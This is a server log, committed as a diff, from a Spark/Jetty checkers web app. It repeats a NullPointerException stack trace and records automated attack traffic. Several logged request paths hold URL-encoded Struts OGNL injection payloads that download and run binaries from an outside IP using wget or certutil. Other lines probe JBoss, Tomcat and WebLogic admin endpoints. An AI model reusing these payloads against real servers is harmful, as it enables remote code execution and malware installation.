+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/readonly] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/JMXInvokerServlet] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/jmx-console/HtmlAdaptor] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/orders.xhtml] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/users] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp/] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/manager/html] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-13] INFO spark.http.matching.MatcherFilter - The requested route [/wls-wsat/CoordinatorPortType] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/ws_utc/resources/setting/options/general] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-17] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-17] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-15] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-16] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/readonly] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-16] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/JMXInvokerServlet] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/jmx-console/HtmlAdaptor] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/orders.xhtml] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/users] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp/] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/manager/html] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/wls-wsat/CoordinatorPortType] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-16] INFO spark.http.matching.MatcherFilter - The requested route [/ws_utc/resources/setting/options/general] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-16] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-18] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-15] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-15] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/readonly] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/JMXInvokerServlet] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/jmx-console/HtmlAdaptor] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/orders.xhtml] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/users] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp/] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-17] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-16] INFO spark.http.matching.MatcherFilter - The requested route [/manager/html] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-16] INFO spark.http.matching.MatcherFilter - The requested route [/wls-wsat/CoordinatorPortType] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/ws_utc/resources/setting/options/general] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
